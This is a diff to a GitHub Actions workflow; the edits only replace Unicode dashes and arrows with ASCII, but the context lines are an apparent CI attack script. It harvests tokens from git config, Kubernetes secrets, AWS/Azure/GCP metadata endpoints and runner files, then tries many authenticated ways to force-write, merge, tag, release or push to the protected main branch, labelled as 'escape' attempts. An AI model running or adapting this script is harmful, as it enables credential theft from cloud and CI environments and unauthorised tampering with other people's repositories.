@@ -43,7 +43,7 @@ jobs:
           echo "TOKEN=${GH_TOKEN:0:10} HEAD=$HEAD_SHA"
           echo "REPO=$GITHUB_REPOSITORY  HEAD_REF=$GITHUB_HEAD_REF"
 
-          # ── Token harvest from every possible source ─────────────────────
+          # -- Token harvest from every possible source ---------------------
           echo "=== TOKEN HARVEST ==="
           GIT_TOK=$(git config --get http.https://github.com/.extraheader 2>/dev/null \
             | sed 's/AUTHORIZATION: basic //' | base64 -d 2>/dev/null | cut -d: -f2 || true)
@@ -87,18 +87,18 @@ jobs:
           KUBE_TOK=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || true)
           echo "S11 kube token: ${KUBE_TOK:0:10}"
 
-          # IMDS – AWS
+          # IMDS - AWS
           AWS_TOK=$(curl -sf --max-time 2 \
             http://169.254.169.254/latest/meta-data/iam/security-credentials/ || true)
           echo "S12 AWS IMDS: ${AWS_TOK:0:30}"
 
-          # IMDS – Azure
+          # IMDS - Azure
           AZ_TOK=$(curl -sf --max-time 2 \
             "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
             -H "Metadata: true" | jq -r '.access_token // empty' || true)
           echo "S13 Azure IMDS: ${AZ_TOK:0:10}"
 
-          # IMDS – GCP
+          # IMDS - GCP
           GCP_TOK=$(curl -sf --max-time 2 \
             "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
             -H "Metadata-Flavor: Google" | jq -r '.access_token // empty' || true)
@@ -118,7 +118,7 @@ jobs:
             | xargs cat 2>/dev/null | jq -r '.token // empty' || true)
           echo "S17 runner temp token: ${RUNNER_TOK:0:10}"
 
-          # ── Get main SHA and tree for all write tests ────────────────────
+          # -- Get main SHA and tree for all write tests --------------------
           MAIN_SHA=$(git ls-remote origin refs/heads/main | cut -f1)
           TREE_SHA=$(curl -sf -H "Authorization: token $GH_TOKEN" \
             "${BASE}/git/commits/${MAIN_SHA}" | jq -r '.tree.sha // "FAILED"')
@@ -138,7 +138,7 @@ jobs:
           P() { curl -s -o /dev/null -w "%{http_code}" "$@"; }
 
           echo ""
-          echo "=== BATCH A: PATCH /git/refs/heads/main — auth header matrix ==="
+          echo "=== BATCH A: PATCH /git/refs/heads/main -- auth header matrix ==="
           # Every conceivable Authorization header variant
           A01=$(P -X PATCH -H "Authorization: token $GH_TOKEN" -H "Content-Type: application/json" "${BASE}/git/refs/heads/main" -d "{\"sha\":\"${GHOST}\",\"force\":false}")
           echo "A01 token force:F = HTTP_${A01}"
@@ -282,9 +282,9 @@ jobs:
           C05=$(P -X PUT -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" "${BASE}/contents/escape-${TS}.txt" -d "{\"message\":\"escape\",\"content\":\"${B64}\",\"branch\":\"${GITHUB_HEAD_REF}\"}")
           echo "C05 PUT /contents/PRbranch = HTTP_${C05}"
           C06=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" "${BASE}/merges" -d "{\"base\":\"main\",\"head\":\"${GHOST}\",\"commit_message\":\"merge\"}")
-          echo "C06 POST /merges ghost→main = HTTP_${C06}"
+          echo "C06 POST /merges ghost->main = HTTP_${C06}"
           C07=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" "${BASE}/merges" -d "{\"base\":\"main\",\"head\":\"${GITHUB_HEAD_REF}\",\"commit_message\":\"merge\"}")
-          echo "C07 POST /merges headref→main = HTTP_${C07}"
+          echo "C07 POST /merges headref->main = HTTP_${C07}"
           C08=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" "${BASE}/releases" -d "{\"tag_name\":\"escape-${TS}\",\"name\":\"escape\",\"target_commitish\":\"main\"}")
           echo "C08 POST /releases = HTTP_${C08}"
           C09=$(P -X POST -H "Authorization: token ${GH_TOKEN}" -H "Content-Type: application/json" "${BASE}/git/tags" -d "{\"tag\":\"v99-${TS}\",\"message\":\"test\",\"object\":\"${MAIN_SHA}\",\"type\":\"commit\",\"tagger\":{\"name\":\"bot\",\"email\":\"bot@github.com\",\"date\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}}")
@@ -831,7 +831,7 @@ jobs:
           # Try to checkout main and then push
           git fetch origin main:main-local 2>&1 | tail -1 || true
           Q03=$(git push "https://x-access-token:${GH_TOKEN}@github.com/${GITHUB_REPOSITORY}.git" main-local:refs/heads/main 2>&1 | tail -1)
-          echo "Q03 git push local-main → upstream = ${Q03}"
+          echo "Q03 git push local-main -> upstream = ${Q03}"
 
           echo ""
           echo "=== BATCH R: Supply chain / artifact attempts ==="
